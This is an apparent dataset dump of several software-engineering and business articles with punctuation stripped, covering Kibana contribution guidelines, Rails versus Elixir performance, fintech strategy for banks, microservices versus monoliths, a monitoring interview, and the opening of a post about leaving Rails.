their own by poking in the dark  There s usually tons of information on how to run tests  how to lint  and how to build  In the Kibana case there s also helpful information around troubleshooting  such as fixing problems with SSL in development or fine tuning source maps   There s a couple of sections in the Kibana CONTRIBUTING guidelines which are a bit different than how other projects  guidelines are laid out  Firstly  there s how we assign priority to different issues  There s five different priority buckets where we place issues in  Priority is important to us  because we may want to fix high priority issues quicker  while lower priority issues don t require immediate attention   At any given time the Kibana team at Elastic is working on dozens of features and enhancements  both for Kibana itself and for a few other projects at Elastic  When you file an issue  we ll take the time to digest it  consider solutions  and weigh its applicability to both the Kibana user base at large and the long term vision for the project  Once we ve completed that process  we will assign the issue a priority  P1   A high priority issue that affects virtually all Kibana users  Bugs that would cause incorrect results  security issues and features that would vastly improve the user experience for everyone  Work arounds for P1s generally don t exist without a code change     A high priority issue that affects virtually all Kibana users  Bugs that would cause incorrect results  security issues and features that would vastly improve the user experience for everyone  Work arounds for P1s generally don t exist without a code change  P2   A broadly applicable  high visibility  issue that enhances the usability of Kibana for a majority users     A broadly applicable  high visibility  issue that enhances the usability of Kibana for a majority users  P3   Nice to have bug fixes or functionality  Work arounds for P3 items generally exist     Nice to have bug fixes or functionality  Work arounds for P3 items generally exist  P4   Niche and special interest issues that may not fit our core goals  We would take a high quality pull for this if implemented in such a way that it does not meaningfully impact other functionality or existing code  Issues may also be labeled P4 if they would be better implemented in Elasticsearch     Niche and special interest issues that may not fit our core goals  We would take a high quality pull for this if implemented in such a way that it does not meaningfully impact other functionality or existing code  Issues may also be labeled P4 if they would be better implemented in Elasticsearch  P5  Highly niche or in opposition to our core goals  Should usually be closed  This doesn t mean we wouldn t take a pull for it  but if someone really wanted this they would be better off working on a plugin  The Kibana team will usually not work on P5 issues but may be willing to assist plugin developers on IRC   The other aspect of our contributing guidelines that s unique is the code review process   Reviewing Pull Requests   In Kibana  Code review is almost always performed by a couple  or more  of Kibana core engineers  but it s important to have our review process out there so that there are no surprises  We follow these guidelines both when creating a Pull Request ourselves  as well as when someone external to the organization submits a PR  Having a single process for everyone results in better quality and more consistency across all Pull Requests  Sometimes this can be a problem when you re trying to be friendly with an external PR  as you may feel inclined to lower the bar just for that one PR so that the contributor is happier  but being clear on the rules benefits everyone in the end   So  you ve been assigned a pull to review  What s that look like   The first rule is a nudge in the direction of the pull requester  Their contributions are important to them  and potentially to others  so don t stand around doing nothing  If you re assigned a PR  review it  Along the same lines  if the PR has several issues   fail fast  doesn t really help here  Instead  point out all the different things that may be wrong with the PR  so that the contributor can fix them all at once instead of engaging in a ping pong match  You are lowering the chances the contributor will return the ball with every pong you serve  as they may become frustrated by all the waiting time  this is something you decidedly want to avoid   1  Understand the issue that is being fixed  or the feature being added  Check the description on the pull  and check out the related issue  If you don t understand something  ask the submitter for clarification   As a contributor  this means an ideal PR links to the issue or issues it s trying to solve  have a description   maybe including a couple of screenshots   and contain a few notes in the commits   For large commits  you should use the message as a summary and then go into detail in the commit message body  You can find great examples of this all over big open source repositories like elastic kibana or elastic elasticsearch   I also like tagging each commit with the affected aspect of the code base  such as  test  Added a couple of tests to KbnServer  or  docs  Improved Contributing Guidelines     2  Reproduce the bug  or the lack of feature I guess   in the destination branch  usually master   The referenced issue will help you here  If you re unable to reproduce the issue  contact the issue submitter for clarification   Not a ton of value to be derived here for the contributor  If you re submitting a new feature  ensure that you re contributing something that doesn t already exist in the codebase   and that it wasn t being worked on either  If you re submitting a bug fix  ensure that the bug was present before your PR and that your PR fixes the aforementioned issues   3  Check out the pull and test it  Is the issue fixed  Does it have nasty side effects  Try to create suspect inputs  If it operates on the value of a field try things like  strings  including an empty string   null  numbers  dates  Try to think of edge cases that might break the code   We don t have a ton of QA folks  so we rely on engineers to keep the code quality flag flying high  At the most crude level  we should figure out whether the changes have the desired impact   do they fix the bug  Is the new feature working as expected  There should also be a decent bit of manual testing in order to ensure that the application isn t broken as a result of merging the PR  Even though the code reviewer is expected to perform these manual tests  there is no point in submitting a PR without performing at least some manual testing beforehand  The back and forth just spends time  a precarious currency you shouldn t be wasting   4  Merge the target branch  It is possible that tests or the linter have been updated in the target branch since the pull was submitted  Merging the pull could cause core to start failing   Always test against the latest version of the upstream repository  In the case of the submitter  this also means that before submitting your PR  you should rebase against master  or whatever branch you intend your PR to be merged into    5  Read the code  Understanding the changes will help you find additional things to test  Contact the submitter if you don t understand something   Naturally  a code review wouldn t be complete if the reviewer didn t read the code  Being thorough is important  but as a reviewer you should keep in mind that not everyone will write code exactly in the same way as you do  That s okay  because you don t own the code base  Being able to live with different coding styles  even if they all fit into the same coding style guide  is an important aspect of reviewing a PR   6  Go line by line  Are there style guide violations  Strangely named variables  Magic numbers  Do the abstractions make sense to you  Are things arranged in a testable way   As a committer  you should try and abide by the rules set forth in contributing style guide  You can mostly get away with not breaking with the style you find in the files you re changing  or copying those coding styles when creating new files  A reviewer may opt to present an alternative way of architecting a piece of code if they anticipate it being counterintuitive or hard to follow in the future  when the PR is merged and away from carefully reviewing eyes  In the long run this may avoid code duplication and all kinds of confusion  so this step is crucially important to get right   7  Speaking of tests Are they there  If a new function was added does it have tests  Do the tests  well  TEST anything  Do they just run the function or do they properly check the output   This should be a given when submitting code to a professionally maintained business project  write tests  Tests will be expected  You should write tests covering any changes you made  Sometimes you can get away with no tests  in cases when you fixed a bug where tests were already failing   More often than not  you ll have to write new tests  In the case of a bug fix  introduce a test that would fail without your code changes  but passes after your code is applied  In the case of a new feature  write tests covering the new surface area in any public interfaces between your new feature and the rest of the code base  In this sense  an interface is anything that reaches into your code from the outside  or where your code reaches into external code   8  Suggest improvements If there are changes needed  be explicit  comment on the lines in the code that you d like changed  You might consider suggesting fixes  If you can t identify the problem  animated screenshots can help the review understand what s going on   Suppose for a minute that contributors are taco trucks  If we consider an open source project as a voracious taco eater  then it s paramount to the open source project for taco trucks to be around  It s hard to keep the taco trucks lining up all around you  so it might be a good idea to nudge them your way and keep them coming back  because you re such a good customer   To keep the taco trucks coming  you need to be gentle with them when purchasing their produce  This is particularly true if this is the first time you re buying from said taco truck   All this is to say that  in order to keep contributors submitting code and not being frustrated  you need to be helpful and indicate what is and what isn t working about a PR  If you want something fixed in the PR  be gentle about it  Chances are  it s one of their first contributions and if given the chance they ll become better and better in adhering to your conventions over time   especially if you re nice to them   Not much to be said on the contributor side here  except it s nice to think of yourself as a taco truck   9  Hand it back If you found issues  re assign the submitter to the pull to address them  Repeat until mergable   Again  the back and forth everyone knows and hates  On both sides  try to keep the noise to a minimum  Some tips here were already addressed  such as having a reviewer submit as much feedback as possible every round  as to avoid friction  When it comes to contributing  try and anticipate the reviewers needs and wants  You may have a reason for not having implemented tests yet  thus maybe a TODO progress list may be in order  helping you communicate what parts of your PR are still missing  Adhering to conventions early and often will also help reduce friction and tighten the feedback loop   10  Hand it off If you re the first reviewer and everything looks good but the changes are more than a few lines  hand the pull to someone else to take a second look  Again  try to find the right person to assign it to   The first reviewer may be unfamiliar with the affected portion of the codebase  or miss important aspects of a PR  Some times  bugs can be easy to miss in large changesets  Design problems can escape the first reviewer  too   It s good to loop in a second reviewer  and maybe a third one too  and repeat the process  Continuous integration tests should be passing by now   Hopefully the extra pairs of eyeballs will catch anything the first pair missed  and everybody will win  In any case  the bulk of the code review will typically be done by the first reviewer  As a general rule  though  the job of a contributor is to satisfy the reviewers  I see it as a game  where I need to pass a few levels before I complete my mission and eat some precious tacos   11  Merge the code When everything looks good  merge into the target branch  Check the labels on the pull to see if backporting is required  and perform the backport if so   The rewardingly boring parts   When enough reviewers gave a contribution their thumbs up  Thank you so much for reading our guidelines   It pays to be nice   Getting Started  Generally speaking  you can always start contributing to a code base right away by reading through and improving their documentation  Once you feel a bit more comfortable with the repository  you can start picking away at issues   In the case of Kibana  you could grab a low fruit or P3 issue  Another effective way of detecting high yield issues is sorting by  Most commented  or  Most  P1  Happy Pull Requesting,"[206 683 1225 656 713 1235 1252 1234 895 800 550]"
214,training-dataset/engineering/510.txt,engineering,Caching  What is it Good For The fact is  caching makes systems more complicated  Expiration and eviction strategies require planning  foresight  and maintenance  Caching adds additional dependencies in the form of database s  that store all the cached data  It adds more libraries dedicated to caching and communication with said external cache  Finally  it makes personalizing content unwieldy  rarely worth the extra effort  All this extra effort is only necessary when a language can t do the heavy lifting for you   Look at the Language  Performance without any caching at all has always been possible  Even for a high traffic site serving dynamic content with sizable payloads  it is entirely attainable  All that is required is a language that is powerful enough to make it possible  That language needs to be inherently fast  concurrent  absent of stop the world garbage collection pauses  and tolerant in the face of errors  That language is also likely to be compiled  and not an interpreted scripting language  Sadly  none of those attributes describe Ruby  MRI   and as a result every production fortified Ruby application must resort to a menagerie of caching for any hope of performance   Ruby isn t alone in the caching conundrum  it is a common pitfall of all the dynamic languages commonly used on the web  However  the majority of my caching experience has been focused on fortifying Rails applications  so I m calling Ruby out   Looking Elsewhere  For years I ve been following the development of Elixir and using it for hobby projects  Only recently have I gotten the opportunity to build production systems with it  Now I m completely spoiled  While I can espouse praise for the language  functional programming  the beauty of pattern matching  and the brilliance of the BEAM all day that probably won t be convincing  Instead  I ll share a few benchmarks that emphasize the performance gulf between Ruby systems and an Elixir system   Comparing Performance  Synthetic benchmarks are a poor measure of anything in the real world  So  let s not pretend this is a scientific comparison  Instead  I ll compare the performance of two systems in production serving up equivalent content  To be fair  the content isn t identical  but that s because the Elixir Phoenix version can be customized without fear of breaking caching  The true configuration of each application is non trivial  and the code is confidential  so I can only share an overview of each   We will be testing is a typical API endpoint that uses token based authentication and returns JSON side loaded associations  Both applications are using Postgres 9 4  and both are hosted on Heroku  but there is a difference in the servers they run on  The Rails application is running on two Performance M dynos while the Phoenix application is running on a single 1x Production dyno   Ruby Rails  Ruby 2 3   Rails 4 2 5 1 with ActiveRecord  Fronted by a Redis cache that combines Perforated and Readthis  Content serialized with ActiveModelSerializers  unused with a warm cache  Tuned to fetch as little data as possible from the database  All associations are preloaded  All content is cached as strings  no marshalling or serialization is performed  All data is generic  not customized to the current user  The request is paginated to 100 primary records  without a limit on side loads  primary records  without a limit on side loads The payload is a hefty 160k  un gzipped  Elixir Phoenix  Elixir 1 2 1   Phoenix 1 1  No entity cache  All fields are fetched from the database  SELECT    All JSON responses are serialized on the fly  directly in views  Includes customized data based on the current user  The request isn t paginated at all  there are 250 primary records  primary records The payload is a massive 724k  un gzipped  The following chart plots the response time in milliseconds when hitting the API endpoint five times  Be warned  these requests were made to production instances with abnormally large data sets  so the values are fairly noisy  The gray line is Rails  the blue is Phoenix   These response times are not characteristic of either system  they are at the extreme upper limit  Even so  serving up 2 5x the records with 4 5x the data  without any caching  the Phoenix API response times are 1 5x 2 5x faster   Stop Squeezing Stones  For several years I focused my effort on squeezing performance out of caching and serialization in the Ruby world  The libraries I ve built have been benchmarked and micro tuned to attain what felt like blazing fast response times  On top of the work put into the libraries there was substantial overhead in constructing APIs to work within the confines of caching  As it turns out  those response times weren t so blazing fast after all,"[214 1335 26 257 90 607 316 929 641 1336 673]"
224,training-dataset/business/336.txt,business,How Bank CIOs Can Get Ahead of Fintech s Disruptions Nonbanks Are Changing the Rules of Digital Banking    Gartner 2015  After the healthcare industry  the banking industry is currently the second biggest target for disruption  This disruption is by Fintech   technology that has moved transactions online   Golden Sachs estimates that upstarts could steal up to  4 7 trillion in annual revenue and  470 billion in profit  from established financial services companies    The era of banking and investment services offered only in branch outlets is certainly well behind us  Most traditional banks have over the recent years come to appreciate the potent threat that nonbanks pose to their future profitability  Unlike them  these upstarts are widely acclaimed for offering simplified and need oriented financial services that are characterized by aggressive pricing   Traditional banking establishments are increasingly finding newer methods of engaging and completing monetary transactions with their clients  Banks must embrace digital banking in order to effectually thwart this worrying trend  Banks ought to fast track failsafe digital initiatives to stay afloat in this industry   First and foremost  banks need to identify client pain points  and ultimately determine the most feasible means of addressing them using Fintech  Here are a few ways for banks to address common pain points to stop nonbanks from getting a greater and greater section of your market share   1  Create Digital Service Channels  The most important thing that banks can do to protect their market share is to broaden their channels of customer engagement to leverage Fintech with online banking and even mobile banking services  Digital banking is meant to be convenient and frictionless by integrating innovations that make it possible to conduct banking transactions anytime  anywhere  An example of one such innovation is e signatures and customers are coming to expect them  According to a Gartner analyst   the banking and credit union attendees I spoke to at this week s Digital Banking Summit all agreed that e signatures are a critical part of improving the customer experience and ensuring the banking industry keeps up with customer expectations for intuitive  convenient and easy to use banking experiences    2  Streamline Payment Processes  Some of the newest innovations in banking and investment services innovations offer streamlined payment options  These innovations increase transaction speed and make it easier for consumers and retailers to conduct business  Companies such as Squire  Dwolla and Peri all offer new and innovative methods  Square Inc  produces software and devices that allow individuals to accept debit card payments using a smartphone or tablet  Dwolla is a company offering online payment services for individuals and companies that is a similar concept to PayPal but with less bottlenecks and lower transaction fees  Peri combines the functions of a payment gateway with advanced image and audio recognition software to enable users to quickly buy the things they see and hear in print  TV and on the radio   3  Provide Automated 24 7 Customer Service  As Fintech pushes transactions online  a lot of your customers are going to get confused when interacting with your online interface  How do they transfer funds between accounts  How do they order a new checkbook  You need to be able to provide automated 24 7 customer service so that you re there to hold their hands at any hour  on any day  The most sophisticated way to do this is to use an online guidance platform that  when overlaid onto your website interface  guides users though common processes  These platforms use onscreen contextual guidance to guide users step by step through processes using walkthroughs  until they ve completed specific tasks  For example  if a user has to transfer funds between accounts  you can create a walkthrough to explain to him her step by step exactly how to do it   Nonbanks are a threat to banks because they deliver needs based solutions at an aggressive price point  Make sure that you remain competitive by accelerating digital business initiatives and improving customer experience by tailoring your services to customer need,"[224 332 1351 92 61 606 357 572 809 695 344]"
234,training-dataset/engineering/304.txt,engineering,REST in Peace  Microservices vs monoliths in real life examplesREST in Peace  Microservices vs monoliths in real life examples  I ve consulted on a dozen microservice projects  Some were awesome  this is the future   and some were equally frustrating  who invented this crap    It s the execution that matters  not the approach  You can succeed or fail with either  Don t just accept the love hate propaganda out there   Here are some experiences I ve had that show how both monoliths and microservices have their place   Picking the right tool for the right job  My team built a news reader app  It had to scrape articles  extract content  classify  serve an API  show admin panel  and manage users   Scrapy  python 2 at that time  is the leader when it comes to web scraping  So we created one microservice that scraped URLs   Here s a bit more on my 15MB Docker image with Tor  Privoxy and a Process manager if you re curious    Newspaper  python 3  is one of the best open source article extraction libraries  So we created one microservice that  given an input URL  returns the extracted content   R has some good libraries for categorization  A colleague with good knowledge of R put together a service for categorizing articles using R s REST API   ActiveAdmin is one of the best and easiest Admin panel interfaces  For a long time  we have been leveraging it for admin screens  and we hooked it up in a few days here as well   Finally for the API gateway  we used Node js with PassportJS  for multiple auth  and ElasticSearch   Before this big re write  our old app was a Rails monolith  It tried to reinvent everything mentioned before  You can imagine the trade offs in code  effort  and time for quality  progress  and output   Bad monoliths try to reinvent the world  They think that code and design patterns are the solution to everything  They strive to build reusable components  libraries  and also become a platform along the way  But they usually don t end up succeeding at any of these goals   Takeaway  1  Microservices are a business solution  not just a technology solution  They save developers from having to waste time reinventing already solved technical problems   I don t care if you call them  Services    Service oriented architecture   or  Microservices   Once we get past buzzwords   monolith vs microservices  boils down to  1 service vs N services    For our application   N services  turned out to be the stack we wanted   Monster CRUD apps  Some enterprise projects can simply be categorized as monster CRUD  Create Read Update Delete  apps  They re a never ending stream of forms  data relationships  transformations  and hugely complicated  Business logic   The scope is huge  but the audience is tiny   Nobody here cares about user experience best practices  and its common to have quick and ugly screens that get the job done   We had one such enterprise transformation project  The old monolith was a database view based integration  It was pretty well designed  and only took a few people to maintain  including the ugly user interfaces   The new backend services were mostly written in Java  so it was difficult to develop  integrate  share  and maintain compatibility  And new front end services got pulled into the ever changing world of single page apps   Deployment required a huge infrastructure automation setup  This was a few years ago  before the developer tooling ecosystem had matured  At the time  every contract change needed to be coordinated and updated by hand  It was the opposite of the previous scenario   the effort output overhead of microservices felt much bigger than that of the old monolith   Takeaway  2  Be careful  Treating microservices as splitting code layers into docker ized boxes can lead to  death by a thousand cuts    Taming a huge dependency tree  We had another legacy enterprise application transformation which did a lot of things like product scraping and parallel aggregation  It was a complicated  already troubled monolith   When we re doing a lot of orthogonal business features inside a single app  it causes a huge compile time dependency tree  with tons of libraries and frameworks  Consequently  the runtime footprint  lifecycle  and build times were also long  This contributed to the real problem  developers couldn t iterate quickly  and time to market of features suffered as a result   Time taken to code a simple feature  several days   Time to upgrade a library  guice  version  1 week   Time taken to upgrade a framework  Spring  version  forever   Trivial stuff had the chance to rip apart every time estimate  Even a small refactor took long  It turns out that death by a thousand cuts is possible with monoliths as well   We divided the project into some functional boundaries  We actively made sure to not share libraries and to avoid the dependency tree bottleneck   For example  we used a modern client library for publishing messages over PubSub for the microservices  But the monolith s big dependency tree did not allow us to use the same library  So we used a different HTTP based PubSub client   Microservices transitionists often make the classic mistake of sharing too many libraries and thereby re create the same compile time dependency trees  a  distributed monolith     But by avoiding sharing functionality  we could use different libraries to accomplish the same tasks without having to upgrade the world   One of the services required a lot of concurrency   1k lookups for every request   It initially leveraged RxJava  But it could be rewritten any day in Golang with the same API contract  and nobody would care about the dependency tree   Takeaway  3  With microservices  you won t hear the term  big rewrite  or  legacy system  ever again because there are no big systems   The scalability myth  My team developed a code evaluation app  It was 90  CRUD  user interface  and reports  and 10  complex code evaluation for a dozen languages   Before we came in  it was a series of microservices   one for each type of language  listening for different message queues  It had a separate front end as a service  admin panel as a service  and so on  Their original reasoning  Scalability   We killed the whole thing and built a better monolith  It was completely done as a single Rails app   user interface  admin  back end  and candidate interface   The code evaluation part ran as a background job  ActiveJob   We shelled this out across simple  stateless  one off Docker containers  The core contract for evaluating code changed from REST JSON into file stdin stdout  It scaled much better than the old system  because we just needed to ramp up the background workers to handle more code evaluations   What looked like a sophisticated application from the outside   supporting 8 major programming languages with intelligent evaluation   was extremely simple on the inside   Takeaway  4  You don t need microservices to run multiple instances of a service or worker  Good monoliths can also scale for some classes of problems   It is quite possible to create scalable monoliths and unscalable microservices  It all comes down to how well you apply each s underlying principles   Microservices as products  One of the most satisfying microservices projects I ve worked on approached microservices as products  Our clients were extremely smart  techno functional people  and they were clearly leveraging microservices as a business tool   They modeled each service as a product  then released multiple products to different customers  They lined up the product releases in a way that each could leverage another s APIs  In turn  they created a brilliant ecosystem  It made them a market leader in their vertical   The average enterprise today uses at least a dozen software products and integrations  The average cloud consumer uses multiple cloud products  I now see even non technical people use micro products and micro apps  For example  one tool for interviewing  one for vacation tracking  one for payslips  etc  People are embracing smaller  more specialized tools that get the job done properly   Takeaway  5  We are strongly and firmly into the micro products  micro apps and micro services era  Better learn to do it well   There is this constant fear of machine learning stealing programming jobs  Most programming jobs are becoming APIs today   Distributed transactions  One of the most common arguments against using microservices is the risks associated with distributed transactions   Are you calling an external Payment gateway system that deducts money  but could fail on your callback  Do you have multiple sign on mechanisms  like email or OAuth   Are you calling third party SaaS products that don t have a rollback option  Are you leveraging Cloud APIs and storage buckets which don t respect your transaction boundary  Do you have workflows spanning multiple request lifecycles to the same service   Then you already have distributed transactions in one way or another  whether you like it or not   The whole idea that one system and one request can represent or control the entire transactional state of the business problem is a fantasy  If you can model your external integrations without distributed locks and transactions  then you can model your internal ones too   Takeaway  6  Distributed locks and transactions aren t free with Monoliths  either   Tooling vs People  Yes  more services means more tooling  This involves continuous integration and continuous deployment  CI CD   infrastructure automation  developer tooling  the ability to design good APIs  contract sharing  documentation  client intelligence and libraries  processes  testing  and a lot of other tools   You must be at least this tall to ride microservices   If an organization does not have the engineering robustness and maturity to effortlessly run a handful of services  12factor  CI  CD  integration  testing  etc   it will be a disaster to switch to many of them   Lots of people coming from a monolith mindset do Big Design Up Front  Microservices are best when they are in your face  Just throw away all the boilerplate  implement the API in a no nonsense way and instead invest time in good quality unit contract tests  Like with tooling VS people   microservices require a change in mindset  and a great deal of unlearning   The good news is that many of these tooling problems have good engineering solutions  Docker  Kubernetes  REST  Swagger  Falcor  gRPC  CI CD Pipeline tools  PaaS  Cloud  and so on  The ecosystem around microservices has already matured quite a bit  and its improving all the time   The bad news is that microservices can t be learned like a framework or tool  They require a holistic approach that comes with experience  You need good people who are not only brute force good coders  but also well rounded engineers with a strong foundation in the whole software development lifecycle  from development to testing to deployment   There are big enterprises that take months for every single integration  And then there are modern companies like Google  Facebook  and Netflix that run thousands of integrated services at a far greater quality and speed  The difference isn t just the tools   it s the people involved and their engineering approach   Takeaway  7  Microservices are a culmination of multiple engineering practices  They have a steep curve of learning  unlearning  and transformation   Conclusion  The microservices approach is just another tool in the solutionist s toolkit  And a tool is just a tool  It can end up being a powerful business asset  or an unproductive developer bottleneck  Whether we re right or wrong all comes down to how we use this tool,"[234 773 60 1377 278 1126 548 1405 1159 695 778]"
251,training-dataset/engineering/506.txt,engineering,Q A James Turnbull  The Art of Monitoring in the Age of MicroservicesBy now  forward thinking system architects are starting to realize that moving to a microservices architecture requires an entirely new set of monitoring tools  Built for long running physical servers  the traditional application monitoring tools are just not suited for keeping tabs on the ephemeral containers that may pop in and out of existence in less than a minute   James Turnbull has been keeping tabs on the emerging practice of microservices monitoring  and recently released a book on the subject   The Art of Monitoring   which both offers some technical specifics and overall strategies for monitoring dynamic systems  Read excerpt here   By day  Turnbull is the chief technology officer for Kickstarter  before which he held technical leadership roles at Docker  Venmo and Puppet Labs  A busy man  he has also written books on Docker  LogStash  Puppet  Nagios and Linux   We caught up with Turnbull to cadge some a bit of free advice on microservices monitoring  as well to learn more about what his new book could offer the project manager  system architect  system administrator or the chief technical officer   What makes traditional monitoring tools not so well suited for the microservices container architecture   Traditional monitoring assumes that a host or a service is long lived  We re now living in a world with the cloud and virtualization and containers  infrastructure is fast moving  and it changes really quickly  Containers appear and disappear far faster than you can set up a Nagios check for them  You have a whole landscape out there where dynamic fast moving short lived infrastructure exists  There s very little in that sort of traditional monitoring space that addresses it   Back in the day  you probably have a server  and it ran Apache  and it ran your website or a web service of some kind or application  The server probably lived some time either as a physical server and then as a virtual machine  It probably had a lifespan as long as the application  You knew it ran Apache  and you probably monitored its disk and its CPU and its memory  It rarely changed   And then all of a sudden  the upstarts in your application or ops team says   We re going to run this Docker thing  Instead of a server  we re just going to run our web app on a cluster of containers   And if we want more containers  we just add more containers   So the person doing the launching says   Well  what are containers called   An ops person says   Well  it s just a random string of numbers   The monitoring person says   Well  how do I monitor that    I don t know  Go figure it out    So it s a fairly immature market still  A lot of open source tools have started to become container aware as well  tools like Sensu and Nagios  But I think the fundamental problem is an architectural one and that s that the current tools are not well suited to a container or services architecture   Because what are you going to do  A container that appears and disappears like its uptime might be measured in minutes or seconds even  Let s say you ve done a service that triggers on a transaction  That service only exists for a matter of seconds  but you want to track its performance in some way  You want to know that it s running   The Art of Monitoring  Table of Contents Chapter 1   An Introduction to Monitoring    An Introduction to Monitoring Chapter 2   Monitoring  Metrics and Measurement    Monitoring  Metrics and Measurement Chapter 3   Events and metrics with Riemann    Events and metrics with Riemann Chapter 4   Storing and graphing metrics  including Graphite and Grafana    Storing and graphing metrics  including Graphite and Grafana Chapter 5   Host based monitoring with collectd    Host based monitoring with collectd Chapter 6   Monitoring hosts and services    Monitoring hosts and services Chapter 7   Containers   another kind of host    Containers   another kind of host Chapter 8   Logs and Logging  covering structure logging and the ELK stack    Logs and Logging  covering structure logging and the ELK stack Chapter 9   Building monitored applications    Building monitored applications Chapter 10   Alerting and Alert Management    Alerting and Alert Management Chapters 11 13   Monitoring an application and stack    Monitoring an application and stack Appendix A  An Introduction to Clojure  So you have to figure out what the right abstraction is to be monitoring  Is it the container  Is it the service  Is it the number of containers inside a service  And you ve got to do the traditional monitoring processes  by pinging a machine  saying   Tell me what the state of this thing is  like am I connected to Apache Port 80  Do an HTTP Get and return some content    If you don t know the name of this thing running your service  and you can t guarantee it s going to be there when you ping it  how do you monitor it  So that sort of presents a whole bunch of really interesting challenges   Regarding possible software out there that companies could use  is it mostly just open source or are the commercial solutions coming along   I think at the moment  particularly in the monitoring services and the container space  there s a limited tool set  A lot of the commercial companies are obviously updating their services  things like Datadog and New Relic  to be container aware  But until recently  there wasn t a lot of hooks into the container  There wasn t a lot of APIs available for monitoring  You d do the very basics  like querying the Docker Daemon  If you had a service  you really have to write a health check of some kind   So it s a fairly immature market still  A lot of open source tools have started to become container aware as well  tools like Sensu and Nagios  But I think the fundamental problem is an architectural one and that s that the current tools are not well suited to a container or services architecture   So what I ve proposed in the book is that the sort of the two types that are monitoring that traditionally  One is poll based monitoring  which is what Nagios does  which polls a service  saying   Are you there  Tell me what your status is   And there s push based monitoring   So what happens in this case  a service or a container might wake up and start running and inside that container is a service discovery tool  It wakes up and tells the monitoring system   I m alive  Here s the metrics from me    In that case  the monitoring system either pings some sort of configuration management database  CMD  or a tool like etcd or Consul   At some point  if that container goes away  it stops spitting metrics out  and your monitoring system goes   Huh  I m not getting any metrics anymore  Do I need to worry about that   It can poll out a discovery system to ask  Is that container still a thing  Do I still need to care about it  Oh  it isn t  You ve turned it off  Okay  I don t need to worry about it anymore   Or it goes   That container is supposed to be still there  and I m not getting any more data from it  I should do something now  I should take some action  I should tell some human that one of these containers that I m expecting to see or this service I m expecting to see is this gone    Do you have any thoughts about the other side of the equation  the presentation of all these metrics to the admin   So I think the really interesting thing about monitoring until recently is that like traditional alerts tended to be email based  They tend to have like an error message like   Disk on host A is 88 percent  Warning   Or   Disk on host A is 95 percent  Critical   If I look at that alert  it s not very contextual  right  I don t really understand whether I got a problem or not   So is 95 percent okay  Is 95 percent of 15 terabytes  Has it grown from 88 to 95 in the last 30 seconds and it s about to get 100 percent and knock the machine over  Or is it going to grow incrementally  It s just hit 95  It might get to 96 by another month   If people are going to be on call  if their sleep is going to be disturbed  if their family lives is going to be disrupted  you want to minimize the pain of that experience by not having them repeatedly work out things that are not important   So I get no context around that sort of alert   If you are dealing with data that should be consumed by computers  for example  like a metric or a log entry  turn it into a structured form  If you re dealing with data that should be consumed by a human  for example  like I m going to be woken up at three o clock in the morning with this alert from PagerDuty  then give me some context   It means that if I open my phone or my laptop  and I read that its 95 percent disk on this machine  then my alert should contain the graphs showing me the disk growth over the last  say  24 hours  as well as maybe some graphs with some additional state to that machine  like that machine s CPU and memory is maxed out  Something is definitely happening on that machine  I can take some action   Rather than spending the first minutes looking at an alert  trying to puzzle out if it is a problem of not  I can immediately get some context around that   If people are going to be on call  if their sleep is going to be disturbed  if their family lives are going to be disrupted  you want to minimize the pain of that experience by not having them repeatedly work out things that are not important  But also if they are being woken up by things that are important  you want to reduce the time to understand a problem and fix it   If you wanted to compare metrics across systems  you need a set of agreed upon definitions of what is being measured and what the tools are that should actually do the measuring  Do you see issues in regard of either   When you think about monitoring  you need to standardize what you are monitoring across your environment  So if I measure a CPU or disk  that I m using the same metric  the same data  So I m making an apple to apples comparison   If I have an application I m monitoring  I m sampling transaction rates every ten seconds  But on the machine  I m sampling the disk I O at one second intervals  So if there s some disparity  and I correlate between those two metrics  one of them is every ten seconds  and one of them is every second  So if I ve got a different resolution  I could quite easily miss behavior in that ten second window that might be impacting the metric at the one second interval   I first look at business metrics  I first look at that thing that my customer and the business cares about  So in the book  I encourage people to choose a resolution and be consistent about it everywhere  so you re always comparing things at the same granularity   And definitions too  Like if you create metrics like useast1 applicationgroup applicationname apache httpcommand get  that s a schema  and you should treat it like one  so you know that every one of your applications that is counting get commands is the same path  the same schema  So that you know that anyone in the organization understand what s happening with this application and  could  compare the behavior of the application in useast1 with the behavior of the application on Heroku or in a Docker container or whatever   Is there one metric or maybe a couple of metrics that are standard go to metrics you look at first for improving the performance   I don t know that there was a single metric  I think it depends on what your application does and what the customer expectation of that application is  I first look at business metrics  I first look at that thing that my customer and the business cares about  and that may be  for example  response time   Amazon cares deeply about how easy it is for someone to do a one click order  One click ordering must make Amazon an enormous amount of money  So if one click ordering is not responsive  that is definitely going to cause people not to use that   So I think about that  and I start measuring that  and then I drill down to the application and look for all the metrics related to that business metric  What are the things that roll up to produce that result  The speed of my API  the speed of my database transactions  things like that  Then underneath  I ll look at the infrastructure metrics like by how much memory and disk and all that stuff  All of these things roll up into one thing  like the response time for one click ordering   Then if the response time for the on click order suddenly changes  like it previously was three microseconds and now five microseconds  I can drill down inside and ask which of the things have changed  I may see one machine is really weird  What s going on there  The database system is really churning along  Aha  We should add an index for that particular table   Then  as soon as we get the index  the response time drops back down to three milliseconds  I m back on track  and my customer is happy    What was the goal in publishing this book   I wrote the book as a framework  as a potential approach  I chose some technologies that I like  but I also recommend a whole bunch of other technologies and so I provide the pros and cons of those alternatives   Hopefully  it will provoke ideas and make you think about how you monitor your systems  At the very least  it should get people to think about they could be doing monitoring differently  That was my intention  is to present a roadmap towards leveling up your monitoring rather than a technology guide on how to implement some tools   TNS research analyst Lawrence Hecht contributed to this article,"[251 1405 1192 1351 778 61 1373 673 830 1029 1297]"
257,training-dataset/engineering/323.txt,engineering,My time with Rails is upLast year I made a decision that I won t be using Rails anymore  nor I will support Rails in gems that I maintain  Furthermore  I will do my best to never have to work with Rails again at work   Since I m involved with many Ruby projects and people have been asking me many times why I don t like Rails  what kind of problems I have with it and so on  I decided to write this long post to summarize and explain everything   This is semi technical  semi personal and unfortunately semi rant  I m not writing this to bring attention  get visitors or whatever  I have no interest in that at all  I m writing this because I want to end my discussions about Rails and have a place to refer people to whenever I hear the same kind of questions   I would also like to tell you a couple of stories that  younger rails devs  have probably never heard of  and highlight some issues that are important enough to at least think about them   The Good Part  I m not going to pretend that everything about Rails is bad  wrong  evil or damaging  That would be not fair  and plain stupid  There s a lot good stuff that you can say about Rails  I m going to mention a couple of  obvious   things for a good balance   So  Rails has made Ruby popular  It s a fact  I ve become a Ruby developer  which in turn changed my career and gave me a lot of amazing opportunities  thanks to Rails  Many rubyists these days have gone down the same path  We are all here thanks to Rails  In many cases  Rails actually made a tremendous impact on people s lives  making them much better  Literally  People got better jobs  better opportunities  and better money  This was a game changer for many of us   Over the years Rails   DHH have inspired many people  including 